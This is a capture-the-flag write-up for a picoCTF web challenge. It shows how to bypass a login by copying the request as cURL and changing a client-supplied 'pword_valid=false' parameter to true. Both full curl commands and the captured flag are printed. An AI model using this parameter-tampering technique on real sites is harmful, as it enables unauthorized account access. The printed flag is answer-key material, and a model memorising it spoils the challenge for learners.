# Lazy Dev - 50 PTS
I really need to login to this website, but the developer hasn't implemented login yet. Can you help?


## Hint
Where does the password check actually occur?
Can you interact with the javascript directly?

# Write Up
Lets visit the website, my link may be different than yours: http://shell2017.picoctf.com:37907/

The first thing i want to do is check out the page source for any possible hints. Right click anywhere on the page > view page source.

Not much here, but i do see "/static/client/js" which must be the javascript that the hint is referring to. I open that next.

I'm not a wiz with java, but it doesn't look theres much implemented here per the comments within the js file. 

I'm going to head back over to the page with the "Enter the password" and use Google Dev tools to take a deeper look. If you are using chrome this is likely already installed. In your browser click on the options menu in the upper right, and select More Tools > Developer Tools. Dev tools is a set of debugging tools built into chrome that does many things. Right away you can see the source of the page which we already looked at.

Head on over to the netowk tool. Now that you have it up, click on the Submit button with no password entered to see what happens when submit is clicked.

You should see a new event Named "login", click it.

Now you should see Headers/Preview/Response/Timing. Take a look at headers. At the very bottom we see "pword_valid: false."

We need that to be true...

Heres the easy way. Right click on the Login event, and select copy > Copy as cURL (cmd).

Paste it into notepad++ and your paste should look similar to mine:

>curl "http://shell2017.picoctf.com:37907/login" -H "Origin: http://shell2017.picoctf.com:37907" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" -H "Content-type: application/x-www-form-urlencoded" -H "Accept: */*" -H "Referer: http://shell2017.picoctf.com:37907/" -H "Connection: keep-alive" --data "pword_valid=false" --compressed

cURL transfers data to the server behind this webpage. With the curl command above, we've completely replicated exactly what happens when the "Submit" button is clicked. The only thing we need to change now is that "pword_valid=False" to "pword_valid=true"

so the modified curl command looks like:

>curl "http://shell2017.picoctf.com:37907/login" -H "Origin: http://shell2017.picoctf.com:37907" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" -H "Content-type: application/x-www-form-urlencoded" -H "Accept: */*" -H "Referer: http://shell2017.picoctf.com:37907/" -H "Connection: keep-alive" --data "pword_valid=true" --compressed

Entering the curl command into my Linux terminal, i'm rewarded with what looks to be the flag:

>client_side_is_the_dark_side6295c70148b5939179f1d1b6b70fb0c7

# Resources
https://curl.haxx.se/docs/manpage.html

https://developers.google.com/web/tools/chrome-devtools/
